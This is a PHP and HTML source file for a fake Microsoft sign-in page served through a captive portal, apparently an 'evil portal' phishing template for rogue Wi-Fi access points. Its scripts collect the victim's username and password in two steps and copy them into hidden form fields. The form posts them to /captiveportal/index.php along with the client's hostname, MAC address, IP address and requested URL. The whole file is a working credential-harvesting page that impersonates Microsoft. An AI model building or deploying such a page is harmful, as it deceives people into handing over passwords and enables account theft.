<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <script type="text/javascript">
        function redirect() {
            setTimeout(function() {
                window.location = "/captiveportal/index.php";
            }, 100);
            }
    </script>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            // Define global variables
            let uname = "";
            let pass = "";

            // Button and input references
            const btnNext = document.getElementById("btn_next");
            const btnSign = document.getElementById("btn_sig");
            const inpUname = document.getElementById("inp_uname");
            const inpPwd = document.getElementById("inp_pwd");

            // Final form and hidden inputs
            const finalForm = document.querySelector("form[method='POST']");
            const hiddenUname = finalForm.querySelector("input[name='uname']");
            const hiddenPass = finalForm.querySelector("input[name='pass']");

            // Save username to global variable when "Next" is clicked
            btnNext.addEventListener("click", function () {
                if (inpUname.value.trim() === "") {
                    document.getElementById("error_uname").textContent = "Please enter your username.";
                    return;
                }
                uname = inpUname.value; // Save username globally
                console.log("Username saved globally:", uname); // Debugging
                document.getElementById("error_uname").textContent = ""; // Clear error message
            });

            // Save password to global variable when "Sign in" is clicked
            btnSign.addEventListener("click", function () {
                if (inpPwd.value.trim() === "") {
                    document.getElementById("error_pwd").textContent = "Please enter your password.";
                    return;
                }
                pass = inpPwd.value; // Save password globally
                console.log("Password saved globally:", pass); // Debugging
                document.getElementById("error_pwd").textContent = ""; // Clear error message
            });

            // Populate hidden fields with global variables before form submission
            finalForm.addEventListener("submit", function (event) {
                if (uname === "" || pass === "") {
                    // Prevent submission if either username or password is missing
                    console.error("Form submission blocked: username or password missing.");
                    event.preventDefault();
                    alert("Please complete all required steps before submitting.");
                    return;
                }
                hiddenUname.value = uname; // Populate hidden username field
                hiddenPass.value = pass;  // Populate hidden password field
                console.log("Form submitted with:", { uname, pass }); // Debugging
            });
        });
    </script>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="assets/favicon.ico" />
    <title>Sign in to your Microsoft account</title>
    <link rel="stylesheet" href="assets/app.css" />
</head>

<body>
    <section id="section_uname">
        <div class="auth-wrapper">
            <img src="assets/logo.png" alt="Microsoft" />
            <h2 class="title mb-16 mt-16">Sign in</h2>
            <form>
                <div class="mb-16">
                    <p id="error_uname" class="error"></p>
                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
                </div>
            </form>
            <div>
                <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p>
                <p class="mb-16 fs-13">
                    <a href="#" class="link">Sign in with a security key
                        <img src="assets/question.png" alt="Question img">
                    </a>
                </p>
            </div>
            <div>
                <button class="btn" id="btn_next">Next</button>
            </div>
        </div>
        <div class="opts">
            <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="assets/key.png" width="30px" /></span> Sign-in options</p>
        </div>
    </section>

    <section id="section_pwd" class="d-none">
        <div class="auth-wrapper">
            <img src="assets/logo.png" alt="Microsoft" class="d-block" />
            <div class="identity w-100 mt-16 mb-16">
                <button class="back">
                    <img src="assets/back.png" />
                </button>
                <span id="user_identity">a@b.com</span>
            </div>
            <h2 class="title mb-16">Enter password</h2>
            <form>
                <div class="mb-16">
                    <p id="error_pwd" class="error"></p>
                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
                </div>
            </form>
            <div>
                <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
                <p class="mb-16">
                    <a href="#" class="link fs-13">Other ways to sign in</a>
                </p>
            </div>
            <div>
                <button class="btn" id="btn_sig">Sign in</button>
            </div>
        </div>
    </section>

    <section id="section_final" class="d-none">
        <div class="auth-wrapper">
            <img src="assets/logo.png" alt="Microsoft" class="d-block" />
            <div class="identity w-100 mt-16 mb-16">
                <span id="user_identity">a@b.com</span>
            </div>
            <h2 class="title mb-16">Stay signed in?</h2>
            <p class="p">Stay signed in so you don't have to sign in again next time.</p>
            <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()">
                <label class="has-checkbox">
                    <input type="checkbox" class="checkbox" />
                    <span>Don't show this again</span>
                </label>
                <input type="hidden" name="uname" value="">
                <input type="hidden" name="pass" value="">
                <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                <input type="hidden" name="target" value="<?=$destination?>">
                <div class="btn-group">
                    <button type="button" class="btn btn-sec">No</button>
                    <button type="submit" class="btn">Yes</button>
                </div>
            </form>
        </div>
    </section>

    <footer class="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <span>.&nbsp;.&nbsp;.</span>
    </footer>
    <script src="assets/app.js"></script>
</body>

</html>
